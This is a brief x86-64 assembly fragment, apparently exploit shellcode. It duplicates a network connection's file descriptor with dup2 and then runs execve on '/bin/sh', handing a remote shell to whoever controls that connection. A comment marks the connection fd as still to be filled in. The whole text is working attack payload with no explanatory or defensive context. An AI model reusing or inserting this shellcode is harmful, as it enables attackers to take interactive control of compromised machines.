do_dup2:
xor esi,esi
mov edi, 131 ; TODO fd of conn #2 must be set here
mov eax, 33 ; syscall number of dup2
syscall
call do_execve
db "/bin/sh",0
do_execve:
xor edx,edx
xor esi,esi
pop rdi
mov eax, 59 ; syscall number of execve
syscall
